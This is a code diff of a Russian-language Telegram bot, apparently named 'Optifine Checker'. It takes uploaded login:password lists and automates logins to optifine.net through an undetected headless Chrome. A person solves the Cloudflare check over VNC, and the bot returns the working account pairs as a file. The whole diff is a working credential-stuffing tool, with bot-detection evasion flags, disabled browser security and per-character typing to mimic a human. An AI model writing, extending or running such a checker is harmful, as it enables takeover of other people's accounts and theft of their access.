@@ -18,22 +18,43 @@ from selenium.common.exceptions import TimeoutException, NoSuchElementException,
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 
-logging.basicConfig(level=logging.INFO)
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO,
+    handlers=[
+        logging.StreamHandler(sys.stdout),
+        logging.FileHandler('/app/debug/bot.log')
+    ]
+)
 logger = logging.getLogger(__name__)
 
+# Конфиг
 TOKEN = os.environ.get('BOT_TOKEN')
 if not TOKEN:
     print("❌ НЕТ ТОКЕНА!")
     sys.exit(1)
 
-ADMIN_IDS = [int(id.strip()) for id in os.environ.get('ADMIN_IDS', '').split(',') if id.strip()]
-ALLOWED_USERS = ADMIN_IDS.copy()
+ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
+ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
+ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []
 
-bot_stats = {'total': 0, 'valid': 0, 'invalid': 0, 'start_time': datetime.now()}
+# Статистика
+bot_stats = {
+    'total': 0,
+    'valid': 0,
+    'invalid': 0,
+    'start_time': datetime.now()
+}
+
+# Хранилище сессий
 active_sessions = {}
+
+# Создаем директории
 os.makedirs('/app/debug', exist_ok=True)
 
 def get_railway_url():
+    """Получает URL для доступа к VNC"""
     try:
         result = subprocess.run(['curl', '-s', 'http://metadata.railway.internal/'], 
                               capture_output=True, text=True, timeout=5)
@@ -46,34 +67,204 @@ def get_railway_url():
         pass
     return "https://cs2-telegram-bot-production.up.railway.app"
 
+class OptifineChecker:
+    def __init__(self):
+        self.driver = None
+        logger.info("🚀 Инициализация OptifineChecker...")
+    
+    def init_driver(self):
+        """Инициализация драйвера с Chrome 120"""
+        try:
+            logger.info("🔍 Запуск Chrome 120 с отключенной защитой...")
+            
+            options = uc.ChromeOptions()
+            
+            # Основные флаги
+            options.add_argument('--no-sandbox')
+            options.add_argument('--disable-dev-shm-usage')
+            options.add_argument('--window-size=1920,1080')
+            options.add_argument('--start-maximized')
+            options.add_argument('--disable-gpu')
+            options.add_argument('--headless=new')
+            
+            # Флаги для отключения защиты
+            options.add_argument('--disable-web-security')
+            options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+            options.add_argument('--disable-blink-features=AutomationControlled')
+            options.add_argument('--disable-setuid-sandbox')
+            options.add_argument('--allow-running-insecure-content')
+            options.add_argument('--ignore-certificate-errors')
+            options.add_argument('--disable-sync')
+            options.add_argument('--disable-client-side-phishing-detection')
+            options.add_argument('--disable-crash-reporter')
+            options.add_argument('--disable-popup-blocking')
+            options.add_argument('--disable-notifications')
+            options.add_argument('--disable-extensions')
+            options.add_argument('--disable-background-networking')
+            options.add_argument('--disable-background-timer-throttling')
+            options.add_argument('--disable-backgrounding-occluded-windows')
+            options.add_argument('--disable-breakpad')
+            options.add_argument('--disable-component-update')
+            options.add_argument('--disable-default-apps')
+            options.add_argument('--disable-domain-reliability')
+            options.add_argument('--disable-ipc-flooding-protection')
+            options.add_argument('--disable-renderer-backgrounding')
+            options.add_argument('--disable-translate')
+            options.add_argument('--no-default-browser-check')
+            options.add_argument('--no-first-run')
+            options.add_argument('--no-pings')
+            options.add_argument('--no-zygote')
+            options.add_argument('--password-store=basic')
+            options.add_argument('--use-gl=swiftshader')
+            options.add_argument('--use-mock-keychain')
+            options.add_argument('--user-data-dir=/tmp/chrome-profile-selenium')
+            
+            logger.info("🚀 Запуск undetected_chromedriver с Chrome 120...")
+            
+            self.driver = uc.Chrome(
+                options=options,
+                version_main=120,  # Явно указываем версию 120
+                headless=True
+            )
+            
+            self.driver.set_page_load_timeout(30)
+            logger.info("✅ Драйвер Chrome 120 готов")
+            return True
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка инициализации: {e}")
+            return False
+    
+    def check_login_page(self):
+        """Проверяет, доступна ли страница входа"""
+        try:
+            self.driver.get("https://optifine.net/login")
+            time.sleep(3)
+            inputs = self.driver.find_elements(By.TAG_NAME, "input")
+            visible_inputs = [i for i in inputs if i.is_displayed()]
+            logger.info(f"✅ Найдено полей ввода: {len(visible_inputs)}")
+            return len(visible_inputs) >= 2
+        except Exception as e:
+            logger.error(f"❌ Ошибка проверки страницы: {e}")
+            return False
+    
+    async def check_account(self, login: str, password: str) -> Dict:
+        """Проверка аккаунта"""
+        logger.info(f"🔍 Проверяю: {login[:20]}...")
+        
+        try:
+            # Поиск полей
+            inputs = self.driver.find_elements(By.TAG_NAME, "input")
+            email_field = None
+            password_field = None
+            
+            for inp in inputs:
+                if inp.is_displayed():
+                    input_type = inp.get_attribute('type')
+                    if input_type in ['text', 'email']:
+                        email_field = inp
+                    elif input_type == 'password':
+                        password_field = inp
+            
+            if not email_field or not password_field:
+                logger.warning("❌ Поля не найдены")
+                return {'login': login, 'status': 'error', 'error': 'Поля не найдены'}
+            
+            # Поиск кнопки
+            buttons = self.driver.find_elements(By.TAG_NAME, "button")
+            submit_button = None
+            for btn in buttons:
+                if btn.is_displayed() and ('login' in btn.text.lower() or 'sign' in btn.text.lower()):
+                    submit_button = btn
+                    break
+            
+            if not submit_button:
+                logger.warning("❌ Кнопка не найдена")
+                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
+            
+            # Ввод логина
+            email_field.clear()
+            for char in login:
+                email_field.send_keys(char)
+                time.sleep(0.03)
+            
+            time.sleep(0.5)
+            
+            # Ввод пароля
+            password_field.clear()
+            for char in password:
+                password_field.send_keys(char)
+                time.sleep(0.03)
+            
+            time.sleep(0.5)
+            
+            # Нажатие кнопки
+            submit_button.click()
+            time.sleep(5)
+            
+            # Проверка результата
+            current_url = self.driver.current_url
+            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
+            
+            if 'downloads' in current_url or 'profile' in current_url:
+                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
+                return {'login': login, 'password': password, 'status': 'valid'}
+            elif 'invalid' in page_text or 'incorrect' in page_text:
+                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
+                return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
+            else:
+                logger.info(f"⚠️ НЕОПРЕДЕЛЕННЫЙ: {login[:20]}")
+                return {'login': login, 'status': 'invalid', 'error': 'Неопределенный результат'}
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка: {e}")
+            return {'login': login, 'status': 'error', 'error': str(e)[:100]}
+    
+    def close(self):
+        """Закрытие драйвера"""
+        if self.driver:
+            try:
+                self.driver.quit()
+                logger.info("✅ Драйвер закрыт")
+            except:
+                pass
+
+# --- Telegram handlers ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Старт"""
     if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ Нет доступа")
+        await update.message.reply_text("❌ **Нет доступа**")
         return
     
-    url = get_railway_url()
+    railway_url = get_railway_url()
+    
     await update.message.reply_text(
-        f"👋 **Optifine Checker**\n\n"
+        f"👋 **Optifine Checker (Chrome 120)**\n\n"
         f"📱 **Доступ к браузеру:**\n"
-        f"{url}/vnc.html\n\n"
-        f"📥 Отправь .txt файл с аккаунтами\n"
-        f"Формат: логин:пароль"
+        f"{railway_url}/vnc.html\n\n"
+        f"📥 **Отправь .txt файл** с аккаунтами\n"
+        f"Формат: логин:пароль\n\n"
+        f"📊 **Статистика:**\n"
+        f"• Проверено: {bot_stats['total']}\n"
+        f"• Найдено рабочих: {bot_stats['valid']}"
     )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Получение файла"""
     if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ Нет доступа")
+        await update.message.reply_text("❌ **Нет доступа**")
         return
     
     doc = update.message.document
     if not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Нужен .txt файл")
+        await update.message.reply_text("❌ **Нужен .txt файл**")
         return
     
     file = await context.bot.get_file(doc.file_id)
     path = f"temp_{update.effective_user.id}_{doc.file_name}"
     await file.download_to_drive(path)
     
+    # Читаем аккаунты
     async with aiofiles.open(path, 'r', encoding='utf-8') as f:
         content = await f.read()
     
@@ -84,21 +275,25 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             accounts.append((l.strip(), p.strip()))
     
     if not accounts:
-        await update.message.reply_text("❌ Нет аккаунтов")
+        await update.message.reply_text("❌ **Нет аккаунтов**")
         return
     
     session_id = f"{update.effective_user.id}_{int(time.time())}"
-    url = get_railway_url()
+    railway_url = get_railway_url()
     
-    keyboard = [[InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"done_{session_id}")]]
+    keyboard = [
+        [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"done_{session_id}")],
+        [InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")]
+    ]
     
     await update.message.reply_text(
-        f"📊 Аккаунтов: {len(accounts)}\n\n"
-        f"1️⃣ Открой браузер:\n{url}/vnc.html\n"
-        f"2️⃣ Нажми Connect\n"
-        f"3️⃣ В Chrome нажми на галочку\n"
-        f"4️⃣ Если просит снова - обнови страницу\n"
-        f"5️⃣ После успеха нажми кнопку",
+        f"📊 **Аккаунтов:** {len(accounts)}\n\n"
+        f"🖥️ **Подключись к браузеру:**\n"
+        f"{railway_url}/vnc.html\n\n"
+        f"1️⃣ Нажми **Connect**\n"
+        f"2️⃣ Найди галочку в Chrome 120\n"
+        f"3️⃣ **Нажми на галочку**\n"
+        f"4️⃣ Вернись и нажми кнопку",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
     
@@ -109,106 +304,124 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка кнопок"""
     query = update.callback_query
     await query.answer()
     
-    if query.data.startswith('done_'):
-        session_id = query.data.replace('done_', '')
+    data = query.data
+    
+    if data.startswith('done_'):
+        session_id = data.replace('done_', '')
         
         if session_id not in active_sessions:
-            await query.edit_message_text("❌ Сессия устарела")
+            await query.edit_message_text("❌ **Сессия устарела**")
             return
         
         session = active_sessions[session_id]
-        await query.edit_message_text("🚀 Запускаю проверку...")
         
-        try:
-            # Запускаем Chrome
-            options = uc.ChromeOptions()
-            options.add_argument('--no-sandbox')
-            options.add_argument('--disable-dev-shm-usage')
-            options.add_argument('--window-size=1920,1080')
-            options.add_argument('--start-maximized')
-            options.add_argument('--disable-gpu')
-            options.add_argument('--headless=new')
-            options.add_argument('--disable-blink-features=AutomationControlled')
-            
-            driver = uc.Chrome(options=options, version_main=145, headless=True)
-            driver.get("https://optifine.net/login")
-            time.sleep(3)
-            
-            results = {'valid': [], 'invalid': []}
-            
-            for login, password in session['accounts']:
-                try:
-                    # Ввод логина
-                    email = driver.find_element(By.CSS_SELECTOR, "input[type='text'], input[type='email']")
-                    email.clear()
-                    email.send_keys(login)
-                    time.sleep(1)
-                    
-                    # Ввод пароля
-                    pwd = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
-                    pwd.clear()
-                    pwd.send_keys(password)
-                    time.sleep(1)
-                    
-                    # Нажатие кнопки
-                    btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
-                    btn.click()
-                    time.sleep(3)
-                    
-                    # Проверка
-                    if 'downloads' in driver.current_url:
-                        results['valid'].append({'login': login, 'password': password})
-                        bot_stats['valid'] += 1
-                    else:
-                        results['invalid'].append(login)
-                        bot_stats['invalid'] += 1
-                    
-                    bot_stats['total'] += 1
-                    driver.get("https://optifine.net/login")
-                    time.sleep(2)
-                    
-                except Exception as e:
-                    logger.error(f"Ошибка при проверке {login}: {e}")
-                    results['invalid'].append(login)
-                    bot_stats['invalid'] += 1
-            
-            driver.quit()
-            
-            # Отправка результатов
-            if results['valid']:
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
-                async with aiofiles.open(filename, 'w') as f:
-                    for acc in results['valid']:
-                        await f.write(f"{acc['login']}:{acc['password']}\n")
-                with open(filename, 'rb') as f:
-                    await query.message.reply_document(f, filename=filename)
-                os.remove(filename)
-            
+        if query.from_user.id != session['user_id']:
+            await query.answer("❌ Это не ваша сессия!", show_alert=True)
+            return
+        
+        await query.edit_message_text("🚀 **Начинаю проверку аккаунтов...**")
+        
+        # Запускаем проверку
+        checker = OptifineChecker()
+        if not checker.init_driver():
+            await query.message.reply_text("❌ **Ошибка запуска браузера**")
+            del active_sessions[session_id]
+            return
+        
+        # Проверяем доступ к странице
+        if not checker.check_login_page():
             await query.message.reply_text(
-                f"✅ Готово!\n"
-                f"Всего: {len(session['accounts'])}\n"
-                f"✅ Рабочих: {len(results['valid'])}"
+                "❌ **Страница входа недоступна**\n\n"
+                "Возможно, Cloudflare все еще активен.\n"
+                "Попробуй еще раз нажать галочку в VNC."
             )
-            
-        except Exception as e:
-            await query.message.reply_text(f"❌ Ошибка: {e}")
+            checker.close()
+            del active_sessions[session_id]
+            return
         
+        # Проверяем аккаунты
+        results = {'valid': [], 'invalid': []}
+        total = len(session['accounts'])
+        
+        status_msg = await query.message.reply_text(f"📊 Прогресс: 0/{total}")
+        
+        for i, (login, password) in enumerate(session['accounts'], 1):
+            if i % 3 == 0:
+                await status_msg.edit_text(f"📊 Прогресс: {i}/{total}\n✅ Рабочих: {len(results['valid'])}")
+            
+            result = await checker.check_account(login, password)
+            
+            if result['status'] == 'valid':
+                results['valid'].append(result)
+                bot_stats['valid'] += 1
+            else:
+                results['invalid'].append(result)
+                bot_stats['invalid'] += 1
+            
+            bot_stats['total'] += 1
+            await asyncio.sleep(2)
+        
+        # Отправляем результаты
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        if results['valid']:
+            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
+            async with aiofiles.open(valid_file, 'w') as f:
+                for acc in results['valid']:
+                    await f.write(f"{acc['login']}:{acc['password']}\n")
+            with open(valid_file, 'rb') as f:
+                await query.message.reply_document(
+                    document=f,
+                    filename=valid_file,
+                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
+                )
+            os.remove(valid_file)
+        
+        await query.message.reply_text(
+            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
+            f"📊 Всего: {total}\n"
+            f"✅ Рабочих: {len(results['valid'])}"
+        )
+        
+        checker.close()
+        
+        # Удаляем временный файл
         if os.path.exists(session['file_path']):
             os.remove(session['file_path'])
+        
         del active_sessions[session_id]
+    
+    elif data.startswith('cancel_'):
+        session_id = data.replace('cancel_', '')
+        if session_id in active_sessions:
+            if os.path.exists(active_sessions[session_id]['file_path']):
+                os.remove(active_sessions[session_id]['file_path'])
+            del active_sessions[session_id]
+        await query.edit_message_text("❌ **Операция отменена**")
 
 def main():
+    """Запуск"""
+    print("=" * 50)
+    print("🚀 ЗАПУСК OPTIFINE CHECKER (Chrome 120)")
+    print("=" * 50)
+    
     app = Application.builder().token(TOKEN).build()
+    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
     print("✅ БОТ ЗАПУЩЕН!")
-    app.run_polling()
+    print("=" * 50)
+    
+    try:
+        app.run_polling()
+    except Exception as e:
+        logger.error(f"Ошибка: {e}")
 
 if __name__ == '__main__':
     main()
